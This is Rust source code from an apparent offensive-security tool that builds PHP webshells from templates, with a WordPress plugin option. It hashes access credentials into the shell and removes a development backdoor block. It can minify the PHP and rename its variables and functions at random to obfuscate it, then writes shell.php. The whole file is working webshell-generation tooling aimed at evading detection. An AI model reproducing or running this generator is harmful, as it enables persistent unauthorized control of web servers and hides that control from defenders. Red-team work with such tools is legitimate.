use std::path::{Path, PathBuf};

use anyhow::Context;
use fancy_regex::Regex;
use sha2::{Digest, Sha512};

use crate::cli_arguments::{CliArguments, CliGenerateArguments, CliGenerateCommand, CliGenerateObfuscation, CliGeneratePhpTemplate};
use crate::enums::php::{PhpCms, PhpVersion};
use crate::extract_unique_strings::extract_unique_strings;
use crate::generate_random_string::{generate_password, generate_random_string};

/// Generate a PHP webshell
pub fn generate_php_webshell(args: &CliGenerateArguments, php_args: &CliGeneratePhpTemplate) -> anyhow::Result<()> {
	let base_template_path = PathBuf::from("templates/php/");

	let template_version = match php_args.template_version {
		PhpVersion::_53 => "5.x",
		PhpVersion::_70 => "7.x",
		PhpVersion::_80 => "8.x",
	};

	let template_path = base_template_path.join(template_version);
	let cms_path = match php_args.cms {
		None => None,
		Some(cms) => {
			match cms {
				PhpCms::Wordpress => Some(base_template_path.join("wordpress/wp-content/plugins/webshell")),
				PhpCms::Joomla => Some(base_template_path.join("NOT IMPLEMENTED YET")),
				PhpCms::Drupal => Some(base_template_path.join("NOT IMPLEMENTED YET")),
			}
		}
	};

	debug!("Base template path: {}", base_template_path.display());
	debug!("Template version path: {}", template_path.display());
	debug!("CMS path: {:?}", cms_path);
	info!("Generating PHP webshell for version: {}", template_version);

	let code_path = template_path.join("template.php");
	let css_path = template_path.join("compiled.css");
	let js_path = template_path.join("compiled.js");

	info!("Using template code file: {}", code_path.display());
	let mut code = String::new();
	if !Path::exists(&code_path) {
		error!("The template code file does not exist: {}", code_path.display());
		std::process::exit(1);
	} else {
		code = std::fs::read_to_string(&code_path)
			.with_context(|| format!("Could not read the template code file at {}", code_path.display()))?
	}

	info!("Using template CSS file: {}", css_path.display());
	let mut css = String::new();
	if !Path::exists(&css_path) {
		warn!("The template CSS file does not exist: {}. Continuing without CSS.", css_path.display());
	} else {
		let css_result = std::fs::read_to_string(&css_path);

		match css_result {
			Ok(css_content) => {
				css = css_content;
			}
			Err(_) => {
				warn!("Could not read the template CSS file: {}. Continuing without CSS.", css_path.display());
			}
		}
	}

	info!("Using template JS file: {}", js_path.display());
	let mut js = String::new();
	if !Path::exists(&js_path) {
		warn!("The template JS file does not exist: {}. Continuing without JS.", js_path.display());
	} else {
		let js_result = std::fs::read_to_string(&js_path);

		match js_result {
			Ok(js_content) => {
				js = js_content;
			}
			Err(_) => {
				warn!("Could not read the template JS file: {}. Continuing without JS.", js_path.display());
			}
		}
	}


	let mut buffer_username = [0u8; 128];
	let hashed_username = base16ct::lower::encode_str(
		Sha512::digest(
			format!("{}{}", args.security.username.as_ref().unwrap(), args.security.salt.as_ref().unwrap())
		).as_slice(),
		&mut buffer_username,
	).unwrap();
	debug!("Hashed username generated: {}", hashed_username);

	let mut buffer_password = [0u8; 128];
	let hashed_password = base16ct::lower::encode_str(
		Sha512::digest(
			format!("{}{}", args.security.password.as_ref().unwrap(), args.security.salt.as_ref().unwrap())
		).as_slice(),
		&mut buffer_password,
	).unwrap();
	debug!("Hashed password generated: {}", hashed_password);
	info!("Username and password generated correctly");

	let unique_strings = extract_unique_strings(&code, r#"__[0-9a-zA-Z_]+__"#);
	debug!("Template placeholders: {:?}", unique_strings);

	let functions_prefix = generate_random_string(php_args.functions_prefix.as_str()).unwrap();
	debug!("Generated functions prefix: {}", functions_prefix);

	for placeholder in unique_strings.iter() {
		let value = match placeholder.as_str() {
			"__CSS__" => css.replace("\"", "\\\"").replace("'", "\\'"),
			"__JS__" => js.clone(),
			"__PREFIX__" => functions_prefix.clone(),
			"__WP__" => "__WP__".to_string(),
			"__USERNAME__" => hashed_username.to_string(),
			"__PASSWORD__" => hashed_password.to_string(),
			"__SALT__" => args.security.salt.as_ref().unwrap().to_string(),
			name => {
				if name.starts_with("__FEAT_") || name.starts_with("__PARAM_") {
					generate_random_string(r"\w\d{2}")?
				} else {
					generate_password(5)?
				}
			}
		};

		code = code.replace(placeholder, &value);
	}
	debug!("Placeholder replaced");

	let drop_template_development_backdoor = Regex::new(
		r#"//\s*TEMPLATE DEVELOPMENT BACKDOOR - START(\s|.)*?//\s*TEMPLATE DEVELOPMENT BACKDOOR - END"#
	).unwrap();
	code = drop_template_development_backdoor.replace_all(code.as_str(), "").to_string();
	debug!("Template development backdoor dropped");
	info!("Webshell generated successfully");

	if args.obfuscation.minify {
		info!("Minifying the generated code ...");
		code = minify(&code);
	}

	if args.obfuscation.obfuscate {
		info!("Obfuscating the generated code ...");
		code = obfuscate(&code, &args.obfuscation, &functions_prefix);
	}

	match php_args.cms {
		None => {
			let output_path = match &args.output {
				Some(output) => PathBuf::from(output),
				None => PathBuf::from("shell.php"),
			};

			std::fs::write(&output_path, code)
				.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;
			info!("Webshell written to {}", output_path.display());
			info!("Username: {}", args.security.username.as_ref().unwrap());
			info!("Password: {}", args.security.password.as_ref().unwrap());
			info!("Enjoy your webshell!");
		}
		Some(_) => {}
	}

	Ok(())
}

/// Minify a PHP code
///
/// This function will remove all comments and unnecessary whitespace from the code, drastically reducing the overall file size
///
/// # Arguments
///
/// * `file_content` - The content of the PHP file to minify
///
/// # Returns
///
/// The minified PHP code
fn minify(file_content: &str) -> String {
	// Regex patterns for line comments (// ...) and multiline comments (/* ... */)
	// The regex pattern uses negative lookbehind to avoid matching URLs and the following strings that may contain "//"
	// - :// - URLs, example: "https://example.com"
	// - "// - Strings concatenation at the beginning of the line, example: "//" . "string"
	// - (// - Strings containing domain-like specifications, example: "connected successfully (//domain)"
	// - \w\s// - Strings containing domain-like specifications (prefixed with a letter and a space), example: "example //domain"
	let comments_patters = Regex::new(r#"((?<![:"(]|\w\s)//.*|/\*(.|\s)*?\*/)"#).unwrap();

	// Remove comments
	let mut minified_content = comments_patters.replace_all(file_content, "").to_string();

	// Replace "<?php\s*" with "<?php " to avoid dropping the whitespace after the opening tag
	let php_opening_tag = Regex::new(r#"<\?php\s*"#).unwrap();
	minified_content = php_opening_tag.replace_all(&minified_content, "<?php ").to_string();

	// Remove whitespaces, tabs, newlines, and double spaces
	minified_content = minified_content.replace("\n", "")
	                                   .replace("\r", "")
	                                   .replace("\t", "")
	                                   .replace("  ", "");
	minified_content
}

/// Obfuscate a PHP code
///
/// This function will obfuscate the variable names and function names in the code
///
/// # Arguments
///
/// * `file_content` - The content of the PHP file to obfuscate
/// * `params` - The obfuscation parameters
/// * `prefix` - The prefix to use for the function names
///
/// # Returns
///
/// The obfuscated PHP code
fn obfuscate(file_content: &str, params: &CliGenerateObfuscation, prefix: &String) -> String {
	let mut obfuscated_content = file_content.to_string();

	// Obfuscate variable names (excluding globals)
	let all_var_definitions = extract_unique_strings(&obfuscated_content, r#"\$\w+"#);
	let php_global_excluded_variables = all_var_definitions.iter().filter(|var| !var.starts_with("$_")).collect::<Vec<_>>();
	debug!("Php variable definitions (without globals): {:?}", php_global_excluded_variables);

	for var in php_global_excluded_variables.iter() {
		let casual_name = generate_random_string(format!("${}", params.obfuscation_variable_format.as_str()).as_str()).unwrap();
		obfuscated_content = obfuscated_content.replace(*var, &casual_name);
	}
	info!("Php variable names obfuscated (count: {})", php_global_excluded_variables.len());

	// Obfuscate function names
	let all_func_definitions = extract_unique_strings(&obfuscated_content, r#"function\s+\w+"#);
	debug!("Php function definitions: {:?}", all_func_definitions);

	for func in all_func_definitions.iter() {
		let casual_name = generate_random_string(format!("function {prefix}{}", params.obfuscation_function_format).as_str()).unwrap();
		obfuscated_content = obfuscated_content.replace(func, &casual_name);
	}
	info!("Php function names obfuscated (count: {})", all_func_definitions.len());

	obfuscated_content
}